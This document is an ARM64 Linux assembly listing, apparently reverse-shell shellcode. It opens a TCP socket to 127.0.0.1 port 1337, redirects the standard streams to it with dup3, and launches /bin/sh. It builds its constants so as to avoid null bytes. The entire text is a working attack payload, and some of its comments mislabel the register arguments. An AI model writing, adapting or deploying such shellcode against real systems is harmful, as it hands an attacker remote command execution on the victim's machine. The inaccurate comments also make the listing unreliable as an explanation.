.section .text
.global _start
_start:
    // socketfd = socket(2, 1, 0)
    mov x0, #2 // protocol = IPPROTO_TCP
    mov x1, #1 // type = SOCK_STREAM
    mov x2, #0 // protocol = 0 (IPPROTO_IP)
    mov x8, #198 // int socket(int domain, int type, int protocol)
    svc  #0
    // save socketfd
    mvn  x4, x0 //socketfd

    // connect(socketfd, &sockaddr, 16)
    lsl  x1, x1, #1
    movk x1, #0x3905, lsl #16
    movk x1, #0x7F, lsl #32
    movk x1, #0x0100, lsl #48
    str  x1, [sp, #-8]!
    add  x1, sp, x2
    mov  x2, #16
    mov  x8, #203
    svc  #0 // here you can put whatewer number, even #1337

    lsr  x1, x2, #2

dup3:
    // dup3(s, 2, 0)
    // dup3(s, 1, 0)
    // dup3(s, 0, 0)
    mvn  x0, x4
    lsr  x1, x1, #1
    mov  x2, xzr
    mov  x8, #24
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x1
    bne  dup3

    // execve("/bin/sh", 0, 0)
    mov  x3, #0x622F
    movk x3, #0x6E69, lsl #16
    movk x3, #0x732F, lsl #32
    movk x3, #0x68, lsl #48
    str  x3, [sp, #-8]!
    add  x0, sp, x1
    mov  x8, #221
    svc  #0x1337

.section .data
    bash: .asciz "/bin/bash"